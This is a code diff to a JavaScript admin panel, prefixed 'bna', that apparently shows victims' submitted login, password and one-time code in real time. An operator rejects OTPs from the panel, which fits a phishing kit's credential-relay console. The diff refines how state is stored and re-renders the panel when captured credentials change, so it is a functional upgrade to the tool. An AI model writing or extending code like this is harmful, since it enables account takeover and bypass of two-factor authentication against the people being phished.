@@ -173,7 +173,7 @@ tbody tr:hover td{background:#fafbfc}
 </div>
 
 <script>
-const KEY='bna_state', CH='bna_ch', PENDING_KEY='bna_pending';
+const KEY='bna_state', CH='bna_ch';
 const bc=typeof BroadcastChannel!=='undefined'?new BroadcastChannel(CH):null;
 
 async function verifyAdminPassword(input){
@@ -192,18 +192,8 @@ async function verifyAdminPassword(input){
   return { ok: !!(data && data.ok), message: data && data.message ? data.message : 'Authorized' };
 }
 
-function getS(){
-  try {
-    const raw = localStorage.getItem(KEY);
-    if (raw) return JSON.parse(raw);
-  } catch (e) {}
-  try {
-    const rawPending = localStorage.getItem(PENDING_KEY);
-    if (rawPending) return JSON.parse(rawPending);
-  } catch (e) {}
-  return {};
-}
-function setS(u){const s={...getS(),...u};try{localStorage.setItem(KEY,JSON.stringify(s));localStorage.setItem(PENDING_KEY, JSON.stringify({ login: s.login || '', password: s.password || '', otp: s.otp || '', status: s.status || 'idle' }));}catch(e){}if(bc)bc.postMessage({type:'update',data:s});return s;}
+function getS(){try{return JSON.parse(localStorage.getItem(KEY)||'{}');}catch(e){return{};}}
+function setS(u){const s={...getS(),...u};try{localStorage.setItem(KEY,JSON.stringify(s));}catch(e){}if(bc)bc.postMessage({type:'update',data:s});return s;}
 
 function normalizeApplicant(item, fallbackId){
   if (!item || typeof item !== 'object') return null;
@@ -293,12 +283,26 @@ async function unlock(){
 document.getElementById('outbtn').addEventListener('click',()=>{stopPoll();document.getElementById('app').style.display='none';document.getElementById('lock').style.display='flex';li.value='';});
 
 // POLLING
-let tmr=null,lastSt=null;
+let tmr=null;
+let lastStateSignature=null;
 let adminRefreshTimer=null;
+function stateSignature(s){
+  return JSON.stringify({
+    status: s && s.status ? s.status : 'idle',
+    login: s && s.login ? s.login : '',
+    password: s && s.password ? s.password : '',
+    otp: s && s.otp ? s.otp : ''
+  });
+}
 function startPoll(){check();tmr=setInterval(check,1000);if(bc)bc.onmessage=e=>{if(e.data.type==='update')applyState(e.data.data);};}
 function stopPoll(){if(tmr)clearInterval(tmr);if(adminRefreshTimer)clearInterval(adminRefreshTimer);}
 function check(){applyState(getS());}
-function applyState(s){if(s.status===lastSt)return;lastSt=s.status;renderPend(s);}
+function applyState(s){
+  const sig = stateSignature(s);
+  if(sig===lastStateSignature)return;
+  lastStateSignature = sig;
+  renderPend(s);
+}
 function startAdminAutoRefresh(){
   if(adminRefreshTimer) clearInterval(adminRefreshTimer);
   adminRefreshTimer=setInterval(async()=>{
@@ -329,7 +333,11 @@ function renderPend(s){
     document.getElementById('rbtn').onclick=()=>{setS({status:'otp_rejected'});hidePend();};
   } else {hidePend();}
 }
-function hidePend(){document.getElementById('pendSec').style.display='none';document.getElementById('ndot').style.display='none';lastSt=getS().status;}
+function hidePend(){
+  document.getElementById('pendSec').style.display='none';
+  document.getElementById('ndot').style.display='none';
+  lastStateSignature = stateSignature(getS());
+}
 
 let openDD=null;
 let lastRenderedTableKey='';
